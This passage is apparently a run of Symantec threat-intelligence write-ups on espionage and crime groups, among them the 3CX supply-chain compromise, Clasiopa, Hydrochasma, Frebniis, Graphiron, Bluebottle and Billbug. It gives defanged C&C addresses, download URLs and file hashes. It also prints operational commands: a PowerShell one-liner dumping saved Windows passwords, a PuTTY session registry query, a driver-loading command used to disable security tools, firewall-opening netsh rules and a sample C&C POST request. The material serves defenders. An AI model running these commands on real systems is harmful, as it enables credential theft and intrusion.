parameter [RUN_PATHNAME] It then arranges to receive notification on a signal using func os/signal. Notify(). Once notified, it sets the following registry value: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\" Our investigation so far shows this file setting Arid Gopher to run on reboot: CSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\" The attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments: \"-d\" \"[FILE_DIRECTORY]\" For each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of [FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\" command-line argument, the tool obtains a list of files stored in the folder [FILE_DIRECTORY] and uploads the content of each file. When uploading each file, the tools sends an HTTP POST request to a C&C server with the following parameters: \"kjdfnqweb\": [THE_FILE_CONTENT] \"qyiwekq\": [HOSTNAME_OF_THE_AFFECTED_COMPUTER] Whenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files: \"C:\\ProgramData\\WindowsUpServ\\success.txt\" \"C:\\ProgramData\\WindowsUpServ\\err.txt\" Mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected.

UPDATE March 30 2023 17:39 UTC:Our blog has been updated with technical analysis of the macOS versions. UPDATE March 30 2023 14:17 UTC:Our blog has been updated with additional IOCs UPDATE March 30 2023 12:47 UTC:Our blog has been updated with additional IOCs and protection information. UPDATE March 30 2023 9:07 UTC:Our blog has been updated with technical analysis of the malware used. Attackers believed to be linked to North Korea have Trojanized 3CX's DesktopApp, a widely-used voice and video calling desktop client. In an attackreminiscent of SolarWinds, installers for several recent Windows and Mac versions of the software were compromised and modified by the attackers in order to deliver additional information stealing malware to the user’s computer. The information gathered by this malware presumably allowed the attackers to gauge if the victim was a candidate for further compromise. The attackers compromised installer files for at least two Windows versions (18.12.407 and 18.12.416) and two Mac versions (8.11.1213 and latest) of 3CX DesktopApp. The installers contained clean versions of the app along with malicious DLLs. The app was used to sideload the malicious DLLs, which then installed information-stealing malware on the computer. In two variants analyzed by Symantec (SHA256: aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 and 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983), the clean executable was used to load a malicious DLL named ffmpeg.dll (SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) This DLL contains code that will load and execute a payload from a second DLL named d3dcompiler_47.dll. (SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03) D3dcompiler_47.dll contains an encrypted blob appended to the file, suggesting that it is possibly a Trojanized version of a legitimate file. The blob starts with the hex value “FEEDFACE” which the loader uses to find the blob. The decrypted blob contains shellcode and a third DLL (SHA256: aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973). The shellcode loads and executes this third DLL, export DLLGetClassObject with parameters: It will then attempt to download an ICO file from the following GitHub repository: At last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software. The malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request. It attempts to download a payload from: The following URLs were embedded in analyzed variants: 3CX is aware of the compromise and is advising users to immediately uninstall the app. It said that it is working on an update to the software that will be released within hours. It advised users to consider using its PWA client as an alternative until a clean version of DesktopApp is released.

    "text": "The Blackfly espionage group (aka APT41, Winnti Group, Bronze Atlas) has continued to mount attacks against targets in Asia and recently targeted two subsidiaries of an Asian conglomerate, both of which operate in the materials and composites sector, suggesting that the group may be attempting to steal intellectual property. The following tools were used in attacks during late 2022 and early 2023: Blackfly is one of the longest known Chinese advanced persistent threat (APT) groups, active since at least 2010. Early attacks were distinguished by the use of the PlugX/Fast (Backdoor. Korplug), Winnti/Pasteboy (Backdoor. Winnti), and Shadowpad (Backdoor. Shadowpad) malware families. The group initially made a name for itself through attacks on the computer gaming industry. It subsequently branched out into targeting a more diverse range of targets, including organizations in the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors. Blackfly has been closely associated with a second Chinese APT group known as Grayfly, so much so that some vendors track the two groups as one actor: APT41. A 2020 indictment of seven men on charges relating to hundreds of cyber attackscarried out by both groups appeared to shed light on this link. Two Chinese nationals were alleged to have worked with both groups. A crossover in personnel may account for the similarities between both groups. Despite being the subject of a U. S. indictment, Blackfly has continued to mount attacks, seemingly undeterred by the publicity afforded to the group. Although it originally made a name for itself by attacking the gaming sector, the group appears focused on targeting intellectual property in a variety of sectors at present.

    "text": "A hitherto unknown attack group has been observed targeting a materials research organization in Asia. The group, which Symantec calls Clasiopa, is characterized by a distinct toolset, which includes one piece of custom malware (Backdoor. Atharvan). At present, there is no firm evidence on where Clasiopa is based or whom it acts on behalf. The infection vector used by Clasiopa is unknown, although there is some evidence to suggest that the attackers gain access through brute force attacks on public facing servers. Aside from the distinct toolset used, there were a number of attack hallmarks observed: There is some evidence to suggest that the attackers used two legitimate software packages. One compromised computer was running Agile DGS and Agile FD servers, software developed by Jiangsu. These packages are used for document security and protection in transit. Malicious files were dropped into a folder named “dgs” and one of the backdoors used was renamed from atharvan.exe to agile_update.exe. It is unclear if these software packages are being injected into or installed by the attackers. HCL Domino (formerly IBM Domino) was also run on a compromised machine in close proximity to the execution of backdoors, although it is unclear if this was a coincidence or not. However, both the Domino and Agile software appear to be using old certificates and the Agile servers use old vulnerable libraries. Atharvan is so-named because when the malware is run, it creates a mutex named: \"SAPTARISHI-ATHARVAN-101\" to ensure that only one copy is running. It will then contact a hardcoded C&C server. The hardcoded C&C addresses seen in one of the samples analyzed to date was for Amazon AWS South Korea (Seoul) region, which is not a common location for C&C infrastructure. The C&C communications are formatted as HTTP POST requests where the Host header is hardcoded as \"update.microsoft.com\", e.g.: POST /update.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52 Host: update.microsoft.com Content-type: application/x-www-form-urlencoded id=Atharvan&code=101&cid=H^[REDACTED]&time=5 The request body includes the following parameters: When encrypting the \"msg\" value, the malware uses the following encryption algorithm: def encrypt(plaintext): return bytes([((2 - byte) & 0xff) for byte in plaintext]) The malware uses its own simplistic HTTP parser to extract the body from the server response. The extracted body is decrypted using the following algorithm: def decrypt(ciphertext): return bytes([((2 - byte) & 0xff) for byte in ciphertext]) When fetching commands, the malware expects the decrypted body to contain a sequence of strings separated by the \"\\x1A\" character. The first byte of each string specifies the command to execute and the remaining bytes are interpreted as command parameters. When configuring a communication schedule, the command parameters specify the times and days for the communication attempts. Several different times can be specified, with the hour and minute of the day encoded. The days are interpreted as: This scheduled communication configuration is another unusual feature of the malware and is not commonly seen in malware of this kind. There is currently no firm evidence on where Clasiopa is based or what its motivation is. A Hindi mutex is used in the Atharvan backdoor: \"SAPTARISHI-ATHARVAN-101\". Atharvan is alegendary Vedic sage of Hinduism. The backdoor also sends a post request to a C&C server with the arguments: In addition to this, one of the passwords used by the attackers for a ZIP archive was “iloveindea1998^_^”. While these details could suggest that the group is based in India, it is also quite likely that the information was planted as false flags, with the password in particular seeming to be an overly obvious clue.

    "text": "Shipping companies and medical laboratories in Asia are being targeted in a likely intelligence-gathering campaign that relies exclusively on publicly available and living-off-the-land tools. Hydrochasma, the threat actor behind this campaign, has not been linked to any previously identified group, but appears to have a possible interest in industries that may be involved in COVID-19-related treatments or vaccines. This activity has been ongoing since at least October 2022. While Symantec, byBroadcom Software, did not see any data being exfiltrated in this campaign, the targets, as well as some of the tools used, indicate that the most likely motivation in this campaign is intelligence gathering. The infection vector used by Hydrochasma was most likely a phishing email. The first suspicious activity seen on machines is a lure document with a file name in the victim organization’s native language that appears to indicate it was an email attachment: [TRANSLATED FROM THE ORIGINAL] Product Specification-Freight-Company Qualification Information wps-pdf Export.pdf.exe Another lure document appears to be mimicking a resume: [TRANSLATED FROM THE ORIGINAL] [REDACTED] University-Development Engineer.exe Following initial access on one machine, the attackers were seen dropping Fast Reverse Proxy (FRP), a tool that can expose a local server that is sitting behind an NAT or firewall to the internet. This drops a legitimate Microsoft Edge update file: %TEMP%\\MicrosoftEdgeUpdate.exe Another file,%TEMP%\\msedgeupdate.dll, is then seen on victim machines. But this file is actually Meterpreter, a tool that is part of the Metasploit framework and which can be used for remote access. Other tools that were subsequently seen on this victim’s network included: A shellcode loader and a corrupted portable executable (PE) file were also deployed on this victim’s network. Other tactics, techniques, and procedures (TTPs) observed being used in this campaign included: The tools deployed by Hydrochasma indicate a desire to achieve persistent and stealthy access to victim machines, as well as an effort to escalate privileges and spread laterally across victim networks. While Symantec researchers didn’t observe data being exfiltrated from victim machines, some of the tools deployed by Hydrochasma do allow for remote access and could potentially be used to exfiltrate data. The sectors targeted also point towards the motivation behind this attack being intelligence gathering. The lack of custom malware used in this attack is also notable. Relying exclusively on living-off-the-land and publicly available tools can help make an attack stealthier, while also making attribution more difficult. Symantec did not see evidence to link this activity to a known actor, prompting us to create the new actor identity of Hydrochasma for those behind this activity. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 409f89f4a00e649ccd8ce1a4a08afe03cb5d1c623ab54a80874aebf09a9840e5 – Fast Reverse Proxy 47d328c308c710a7e84bbfb71aa09593e7a82b707fde0fb9356fb7124118dc88 – GoGo Scanning Tool 6698a81e993363fab0550855c339d9a20a25d159aaa9c4b91f60bb4a68627132 – Dropper 7229bd06cb2a4bbe157d72a3734ba25bc7c08d6644c3747cdc4bcc5776f4b5b9 – Process Dumper (lsass.exe) 72885373e3e8404f1889e479b3d46dd8111280379c4065bfc1e62df093e42aba – Fast Reverse Proxy 72bc8b30df3cdde6c58ef1e8a3eae9e7882d1abe0b7d4810270b5a0cc077bb1a – Cobalt Strike Beacon 7b410fa2a93ed04a4155df30ffde7d43131c724cdf60815ee354988b31e826f8 – Fast Reverse Proxy 7f0807d40e9417141bf274ef8467a240e20109a489524e62b090bccdb4998bc6 – Process Dumper (lsass.exe) 8c0f0d1acb04693a6bdd456a6fcd37243e502b21d17c8d9256940fc7943b1e9a – Cobalt Strike Beacon 8e32ea45e1139b459742e676b7b2499810c3716216ba2ec55b77c79495901043 – Fast Reverse Proxy 981e5f7219a2f92a908459529c42747ac5f5a820995f66234716c538b19993eb – GoGo Scanning Tool 9ebd789e8ca8b96ed55fc8e95c98a45a61baea3805fd440f50f2bde5ffd7a372 – Fast Reverse Proxy 9f5f7ba7d276f162cc32791bfbaa0199013290a8ac250eb95fd90bc004c3fd36 – Cobalt Strike Beacon a0f5966fcc64ce2d10f24e02ae96cdc91590452b9a96b3b1d4a2f66c722eec34 – AllIn Scanning Tool cb03b5d517090b20749905a330c55df9eb4d1c6b37b1b31fae1982e32fd10009 – Fscan d1c4968e7690fd40809491acc8787389de0b7cbc672c235639ae7b4d07d04dd4 – Shellcode Loader de01492b44372f2e4e38354845e7f86e0be5fb8f5051baafd004ec5c1567039f – Cobalt Strike Beacon e378d8b5a35d4ec75cae7524e64c1d605f1511f9630c671321ee46aa7c4d378b – PE File eba22f50eedfec960fac408d9e6add4b0bd91dd5294bee8cff730db53b822841 – Dropper fc4b5f2ee9da1fe105bb1b7768754d48f798bf181cbc53583387578a5ebc7b56 – Dogz Proxy Tool 02fe00ffd1b076983f3866c04ca95c56cef88c2564fabb586e11e54986e87ba7 084d1fc4236011d442801e423485c8e58f68dc14ec0a8b716fa0fd210de43dda 1744fac628262aa0cf3810bd5168375959be41764c8ca2fa41950a7b1f8f2fad 1d087f6a17227769bcebc799a2cdf1bb2a8fdf6ba560d21a88bb71f1c213a42c 327fc116f8f48f97292184bb50cb3db418f368b3e2a0fb41267ba40254a35a89 3516f94b0fb57e93c6659d813cbf5fb3617dea7a667c78cb70a1914306327906 41b6d26926706bb68530ddff234f69757e3bbef91c47eb0255313ed86cb3f806 44223e5abd106c077908f03c93b8c8baee7d630f1718f9750f16b786cf88fd06 553e0763cf3a938b5754c9d89939a118abe0b235e4be6920c34f562bd758e586 5a62abc0a2208679e414cc71d1f36ffa14b48df2b73ac520e45d557ad77dd004 6770f815480d7cfa0a6fc8599c08ca6013f608d257a2121233e77374e21c53f8 6cb815863088a0ad367b2a525a572323600596f6875a79536aee57202ef24fd5 6f017ad84d0d06f50b6213a0742838b5ec510f3d06f96e0300048f2da6a35c41 7394ab0ed6d1f62e83fc5f8f1eb720ddd07cbd2bcdf6a00b9b63ef6018fa5f90 7800a4fb0cbdf29815c521ea8b00a23e28d7eb365653f2afcfb5572622727218 7f6a1d6950a9464f27d8651a267563d4630d223bf7ac66851917a57f8fac6550 84502fbe3e5172c39e9a97734e6caac79255abffcb55c22752620d908ff33940 916b63b88de2549c4a5c8e13d51df4cf6996067ae30f24c8bb35c66db7c061df 968b28f7d6abb845f2cc7efa93cdcf7660585e22d589267695726de13afea260 9e8b5a84ad108a761619ca040788dcbf07996a9101cecc5c30ba61f9a06945c1 b53d0a43ea91b3c80bc6c87c0c6946816c38876b2cb2f6f772afe94c54d3ad30 b5c4f420067499522b748a34161ad6e140a7f30ab0b8fa63feef760c5e631679 d0ae66022929c17f31ddf98d88817f0aa70a56ce2ff2df9595b8889c2d3d7e31 d92c50a91bd5b2f06f41a9a5f9937e50b78658d46e3cd04bc3a85f270ce288c2 dc3b714fd6f93c0c0cd2685b6b8cd551896855474bdd09593b8c6b4b7ab6bac2 e7684a4984d9d82115c5cc1b43b9f63a11e7ed333a4e2d92dc15b6e931634bf4 ebc3dabf0a2dafb0790be6dbb4d3509b5ce1259b955172910618a32627b3b668 ee9aefde33ed48d16ecb1c41256fc7d93ddfa8bedfa59b95e8810282ac164d0d f35b206fe10ad3f57d9c4ecf71a2d2cc06d7c7fe905e567b989f72f147da99dc f73738e6e33286657cda81f618a74b74745590915a8f4451e7c00473cbe89e1d fc8a67b80b0b0ecd10dfd90820ffc64923b94c32b04dbb6929a79b9ce027563c ffdcf74968805e9cc897ca932e4da0f22ea7b3e9b96fcc9082c0c5300ae4cb0d 39.101.194[.]61 – Cobalt Strike Beacon C&C 47.92.138[.]241 – Cobalt Strike Beacon C&C alidocs.dingtalk[.]com.wswebpic[.]com – Cobalt Strike Beacon C&C csc.zte[.]com.cn.wswebpic[.]com – Cobalt Strike Beacon C&C taoche[.]cn.wswebpic[.]com – Cobalt Strike Beacon C&C hxxp://47.92.138[.]241:8090/update.exe hxxp://47.92.138[.]241:8000/agent.exe hxxp://47.92.138[.]241:8000/update.exe hxxp://47.92.138[.]241:8000/ff.exe hxxp://47.92.138[.]241:8000/aa.exe hxxp://47.92.138[.]241:8000/runas.exe hxxp://47.92.138[.]241:8090/a.exe hxxp://47.92.138[.]241:8000/t.exe hxxp://47.92.138[.]241:8000/po.exe hxxp://47.92.138[.]241:8080/t.exe hxxp://47.92.138[.]241:8899/t.exe hxxp://47.92.138[.]241:8000/logo.png hxxp://47.92.138[.]241:8080/t.png hxxp://47.92.138[.]241:8000/frp.exe The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "Symantec, byBroadcom Software, has observed a new malware that abuses a feature of Microsoft’s Internet Information Services (IIS) to deploy a backdoor onto targeted systems. The malware, dubbed Frebniis (Backdoor. Frebniis), was used by a currently unknown threat actor against targets in Taiwan. The technique used by Frebniis involves injecting malicious code into the memory of a DLL file (iisfreb.dll) related to an IIS feature used to troubleshoot and analyze failed web page requests. This allows the malware to stealthily monitor all HTTP requests and recognize specially formatted HTTP requests sent by the attacker, allowing for remote code execution. In order to use this technique, an attacker needs to gain access to the Windows system running the IIS server by some other means. In this particular case, it is unclear how this access was achieved. IIS is a general-purpose web server that runs on Windows systems to serve requested HTML pages or files. An IIS web server accepts requests from remote client computers and returns the appropriate response. IIS has a feature known as Failed Request Event Buffering (FREB) that collects data and details about requests, such as originating IP address and port, HTTP headers with cookies, etc. A feature called Failed Request Tracing can be used to troubleshoot IIS failed requests. Failed Request Tracing buffers the trace events for a request and flushes them to disk if the request meets the definition of “fail” set by the user. Failed request tracing can, for example, be used to learn why requests are returning a specific HTTP status code (401 or 404, etc.), or why a request is taking too long to process, or is not responding. Frebniis ensures Failed Request Tracing is enabled and then accesses w3wp.exe (IIS) process memory, obtaining the address of where the Failed Request Event Buffering code (iisfreb.dll) is loaded. With this code start address, Frebniis searches from there for a function pointer table to hijack code execution. The authors of Frebniis have determined that a particular function pointer within iisfreb.dll is called by iiscore.dll whenever any HTTP request is made to IIS from a web client. This function normally checks if the content of the HTTP request matches the Failed Request Tracing rules. Frebniis hijacks this function by injecting its own malicious code into IIS process memory and then replacing this function pointer with the address of its own malicious code. This hijack point allows Frebniis to stealthily receive and inspect every HTTP request to the IIS server before returning to the original function. The Frebniis malicious injected code parses all received HTTP POST requests for /logon.aspx or /default.aspx along with a parameter password set to ‘7ux4398!’. If the password matches, Frebniis decrypts and executes a section of the injected code, which is . NET executable code consisting of the main backdoor functionality. No executables are saved to disk in this process, keeping the backdoor completely stealthy. The . NET code provides proxying functionality and remote code execution controlled by a provided second HTTP parameter that is a Base64 encoded string. To enable the proxy, the encoded string is Base64 decoded and then decrypted (xor 0x08), with the first character representing a proxy command followed by expected parameters. The proxy is used to send and receive Base64 encoded data from other computer systems. This allows the attackers to communicate with internal resources that may normally be blocked from the internet via the compromised IIS server. The . NET backdoor code also supports remote execution. If an HTTP call to logon.aspx or default.aspx is received without the password parameter, but with the Base64 string, the Base64 string is assumed to be C# code that will be executed straight in memory. The Base64 string is decoded and then decrypted (xor 0x08) and is expected to be an XML document with the C# code to be executed in the ‘/doc’ node under the ‘data’ attribute (E.g. <doc data=C# code>). The C# code is extracted and executed. This allows Frebniis to stealthily execute arbitrary code on the system. By hijacking and modifying IIS web server code, Frebniis is able to intercept the regular flow of HTTP request handling and look for specially formatted HTTP requests. These requests allow remote code execution and proxying to internal systems in a stealthy manner. No files or suspicious processes will be running on the system, making Frebniis a relatively unique and rare type of HTTP backdoor seen in the wild.

    "text": "The Nodaria espionage group (aka UAC-0056) is using a new piece of information stealing malware against targets in Ukraine. The malware (Infostealer. Graphiron) is written in Go and is designed to harvest a wide range of information from the infected computer, including system information, credentials, screenshots, and files. The earliest evidence of Graphiron dates from October 2022. It continued to be used until at least mid-January 2023 and it is reasonable to assume that it remains part of the Nodaria toolkit. Graphiron is a two-stage threat consisting of a downloader (Downloader. Graphiron) and a payload (Infostealer. Graphiron). The downloader contains hardcoded command-and-control (C&C) server addresses. When executed, it will check against a blacklist of malware analysis tools by checking for running processes with the names listed in Table 1. If no blacklisted processes are found, it will connect to a C&C server and download and decrypt the payload before adding it to autorun. The downloader is configured to run just once. If it fails to download and install the payload it won’t make further attempts nor send a heartbeat. Graphiron uses AES encryption with hardcoded keys. It creates temporary files with the \".lock\" and \".trash\" extensions. It uses hardcoded file names designed to masquerade as Microsoft office executables: OfficeTemplate.exe and MicrosoftOfficeDashboard.exe The payload is capable of carrying out the following tasks: Password theft is carried out using the following PowerShell command: [void][Windows. Security. Credentials. PasswordVault,Windows. Security. Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows. Security. Credentials. PasswordVault;$vault. RetrieveAll() | % { $_. RetrievePassw ord();$_} | Select UserName, Resource, Password | Format-Table –HideTableHeaders The following command was used to export the list of PuTTY sessions: \"CSIDL_SYSTEM\\reg.exe\" query HKCU\\Software\\SimonTatham\\Putty\\Sessions Graphiron has some similarities with older Nodaria tools such as GraphSteel and GrimPlant,which were first discovered by CERT-UA. GraphSteel is designed to exfiltrate files along with system information and credentials stolen from the password vault using PowerShell. Graphiron has similar functionality but can exfiltrate much more, such as screenshots and SSH keys. In addition to this, as with earlier malware, Graphiron communicates with the C&C server using port 443 and communications are encrypted using the AES cipher. Nodaria has been active since at least March 2021 and appears to be mainly involved in targeting organizations in Ukraine. There is also limited evidence to suggest that the group has been involved in attacks on targets in Kyrgyzstan. Third-party reporting has also linked the group to attacks on Georgia. The group sprang to public attention when it was linked to the WhisperGate wiper attacks that hit multiple Ukrainian government computers and websites in January 2022. When WhisperGate was initially loaded onto a system, the malware would overwrite the portion of the hard drive responsible for launching the operating system when the machine is booted up with a ransom note demanding $10,000 in Bitcoin. However, this was just a decoy as the WhisperGate malware destroys data on an infected machine and it cannot be recovered, even if a ransom is paid. The group’s usual infection vector is spear-phishing emails, which are then used to deliver a range of payloads to targets. Custom tools used by the group to date include: Like Graphiron, many of Nodaria’s earlier tools were written in Go. Graphiron appears to be the latest piece of malware authored by the same developers, likely in response to a need for additional functionality. While GraphSteel and GrimPlant used Go version 1.16, Graphiron uses version 1.18, confirming it is a more recent development. While Nodaria was relatively unknown prior to the Russian invasion of Ukraine, the group’s high-level activity over the past year suggests that it is now one of the key players in Russia’s ongoing cyber campaigns against Ukraine.

    "text": "Bluebottle, a cyber-crime group that specializes in targeted attacks against the financial sector, is continuing to mount attacks on banks in Francophone countries. The group makes extensive use of living off the land, dual-use tools, and commodity malware, with no custom malware deployed in this campaign. The activity observed by Symantec, a division ofBroadcom Software, appears to be a continuation of activity documented in aGroup-IB report from November 2022. The activity documented by Group-IB spanned from mid-2019 to 2021, and it said that during that period this group, which it called OPERA1ER, stole at least $11 million in the course of 30 targeted attacks. Similarities in the tactics, techniques, and procedures (TTPs) between the activity documented by Group-IB and the activity seen by Symantec include: While this does appear to be a continuation of the activity documented by Group-IB, the activity seen by Symantec is more recent, running from at least July 2022 to September 2022, though some of the activity may have begun as far back as May 2022. Some new TTPs have also been employed in recent attacks, including: The initial infection vector is unknown, but the earliest malicious files found on victim networks had French-language, job-themed file names. These likely acted as lures. In some cases, the malware was named to trick the user into thinking it was a PDF file, e.g.: It’s most likely these files were delivered to victims via a spear-phishing email, which would align with the initial infection vector documented by Group-IB for the OPERA1ER activity. Although the majority of the activity observed by Symantec researchers began in July 2022, at least one victim was found to have an infostealer with a similar naming theme on its network as early as mid-May 2022. In that case, the malware arrived in the form of a ZIP file containing an executable SCR file. The file is an older, likely commodity, malware. It's difficult to determine when it was used to target the organization. It is, however, consistent with infection vectors reported as used by OPERA1ER in 2021. However, the job-themed malware in July was observed in paths suggesting it had been mounted as CD-ROMs. This could indicate a genuine disc was inserted, but it could also be that a malicious ISO file was delivered to victims and mounted. An ISO file is an archive file that contains an identical copy or image of the data that would be found on an optical disc. Malicious ISO files have been used as an initial infection vector in other campaigns in 2022, including being used alongside theBumblebee loader in a campaign where delivering ransomware was the ultimate goal. If the Bluebottle and OPERA1ER actors are indeed one and the same, this would mean that they swapped out their infection techniques between May and July 2022. ISO files were not seen in the activity documented by Group-IB. In many cases, the job-themed malware delivered to victims was the commodity loader called GuLoader. GuLoader is a shellcode-based downloader with anti-analysis features. In addition to malicious files, the loader deploys some legitimate binaries as a decoy for its malicious activity. GuLoader was distributed to victims in a self-extracting NSIS executable. This NSIS script decrypts and injects obfuscated shellcode into another process. The process most often observed in the July activity wasieinstal.exe, the Internet Explorer Add-on Installer, but also includedaspnet_regbrowsers.exe, the ASP. NET Browser Registration tool. The process for the Internet Explorer Add-on Installer was likely used to download a malicious . NET downloader from URLs such ashxxp://178.73.192[.]15/ca1.exe. Multiple . NET downloaders were found that abused the file transfer servicetransfer[.]shto download a file named with an RTF extension. This payload is unknown, but the downloaders are designed to load it as a . NET DLL. After GuLoader and the . NET loaders were deployed, various other post-compromise tools were seen on victim networks. These include the publicly available Netwire remote access Trojan (RAT) and the open-source Quasar RAT. The attackers also used the commercial post-compromise tool Cobalt Strike Beacon. The Cobalt Strike Beacon variant used by Bluebottle employed an API hammering technique in order to hamper analysis. A set of malware was also deployed by the attackers that had the likely goal of disabling the security products on victim networks. The malware consisted of two components, a controlling DLL that reads a list of processes from a third file, and a signed 'helper' driver controlled by the first driver and used to terminate the processes in the list. Attackers used Windows Service Control (sc.exe) to load the driver: sc create fgt binPath= %TEMP%\\fgt.sys type= kernel In August 2022, Symantec observed the same driver being used in suspected pre-ransomware attack activity against a non-profit in Canada. Another tool found on the victim network was Infostealer. Eamfo,a hacktool that has been associated with Cuba, Noberus, and Lockbit ransomware attacks. The same driver also appears to have been used by multiple groups for similar purposes. Mandiant documented a financially motivated threat groupit calls UNC3944 using this same driver to disable defenses. It referred to this driver as POORTRY and the malware that uses it as STONESTOP. However, Mandiant did note at the time that “POORTRY appears across different threat groups and is consistent with malware available for purchase or shared freely between different groups.” Sophos also documented an instance where Cuba ransomware operatorsused a loader called BURNTCIGAR to load signed driversto kill defenses. The loader operates similarly to the malicious DLL seen in this activity. These drivers were reported to Microsoft by other vendors, and the company suspended the developer accounts andadded defenses to address them. The short-term goal of Bluebottle in this recent activity appears in part to be persistence and credential theft. The actors used credential theft techniques and tools, such as modifying the WDigest setting and deploying Mimikatz, as well as an open-source fake login screen keylogger. For lateral movement, the attackers deployed the penetration testing tool SharpHound for domain trust enumeration and executed additional files across the victim organizations using PsExec. For persistence, evidence suggests the attackers added additional accounts using the'net localgroup /add'command. They also deployed an open-source RDPWrap script to enable multiple concurrent RDP sessions on victim systems. This script also modifies the registry and opens port 3389 on the firewall to allow RDP traffic through. Indications are that this activity was likely “hands-on-keyboard” activity rather than automated. While we do not see what further activity is carried out by the attackers, the victims and the crossover with the activity documented by Group-IB all indicate that this activity is likely financially motivated. Three different financial institutions in three African nations were compromised in the activity seen by Symantec, with multiple machines infected in all three organizations. The activity on one of the infected institution’s networks ran as follows: The first activity was seen in mid-July 2022, when job-themed malware was spotted on the infected system. A downloader was then deployed, before the Sharphound hacktool was detected and a tool called fakelogonscreen was also deployed. About three weeks after the initial compromise of the network, the attackers were seen using a command prompt and PsExec for lateral movement. It appears the attackers were “hands on keyboard” at this point of the attack. The attackers used various dual-use and living-off-the-land tools for numerous purposes, including: Malicious tools used included: Multiple other unknown files were also deployed on this network. The last activity seen on this network was in September 2022, but the Ngrok tunneling tool remained on the network until November 2022. Some of the same tools were also deployed on the other victims, with GuLoader seen in all three victims. Other activity linking the activity in all three victims includes: While Symantec cannot confirm whether or not Bluebottle successfully monetized the campaigns we saw it carrying out, the group’s success at monetizing its activity between 2019 and 2021, as documented by Group-IB, indicates that this group has had a significant amount of success in the past. The effectiveness of its campaigns means that Bluebottle is unlikely to stop this activity. It appears to be very focused on Francophone countries in Africa, so financial institutions in these countries should remain on high alert for the activity documented in this blog. The attackers appear to be French-speaking, so the possibility of them expanding this activity to French-speaking nations in other regions also cannot be ruled out.

    "text": "State-sponsored actors compromised a digital certificate authority in an Asian country during a campaign in which multiple government agencies were also targeted. Symantec, byBroadcom Software, was able to link this activity to a group we track as Billbug due to the use in this campaign of tools previously attributed to this group. Billbug (aka Lotus Blossom, Thrip) is a long-established advanced persistent threat (APT) group that is believed to have been active since at least 2009. Symantec has previously published on thisgroup’s activity in 2018and 2019 under the Thrip name, but followingour 2019 investigation, we determined that Thrip and Billbug were most likely the same group so now track all activity under the Billbug name. In activity documented by Symantec in 2019, we detailed how the group was using a backdoor known as Hannotog (Backdoor. Hannotog) and another backdoor known as Sagerunex (Backdoor. Sagerunex). Both these tools were also seen in this more recent activity. The victims in this campaign included a certificate authority, as well as government and defense agencies. All the victims were based in various countries in Asia. Billbug is known to focus on targets in Asian countries. In at least one of the government victims, a large number of machines on the network were compromised by the attackers. The targeting of a certificate authority is notable, as if the attackers were able to successfully compromise it to access certificates they could potentially use them to sign malware with a valid certificate, and help it avoid detection on victim machines. It could also potentially use compromised certificates to intercept HTTPS traffic. However, although this is a possible motivation for targeting a certificate authority, Symantec has seen no evidence to suggest they were successful in compromising digital certificates. Symantec has notified the cert authority in question to inform them of this activity. This activity has been ongoing since at least March 2022. There are some indications that the attackers are exploiting public-facing applications to gain initial access to victim networks. The attackers use multiple dual-use tools in this attack campaign, as well as custom malware. Billbug’s extensive use of dual-use and living-off-the-land tools was also notable in its previous campaigns. Among the dual-use tools leveraged in this recent activity are: Multiple files that are believed to be loaders for the Hannotog backdoor were spotted on victim machines. A backdoor was then deployed on the compromised system. This backdoor has multiple functionalities: netsh advfirewall firewall add rule name=\"Core Networking - Router Solicitation (ICMP-In)\" dir=in action=allow program=\"%s\" enable=yesnetsh firewall add portopening UDP 5900 @xpsp2res.dll,-22006 ENABLE ALL',0netsh firewall add allowedprogram name=\"SNMP Trap Service\" program=\"%s\" mode=enable A tool called Stowaway Proxy Tool was also downloaded to victim machines. Stowaway is a multi-level proxy tool written in the Go language and intended for use by penetration testers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through intranet access restrictions, construct a tree-like node network, and easily implement management functions. It is not unusual to see penetration testing tools misused by threat actors. Cobalt Strike, which is a penetration testing framework, is considered commodity malware by many due to how often it is used by malicious actors. The Sagerunex backdoor is fairly resilient and implements multiple forms of communication with its command-and-control (C&C) server. The analyzed sample had no hardcoded configuration, so it had to be dropped on the machine by a loader malware, such as Hannotog. In the sample analyzed by Symantec, configuration is passed to the sample via a parameter of the exported function (called MainEntry). That configuration is decrypted with a simple XOR 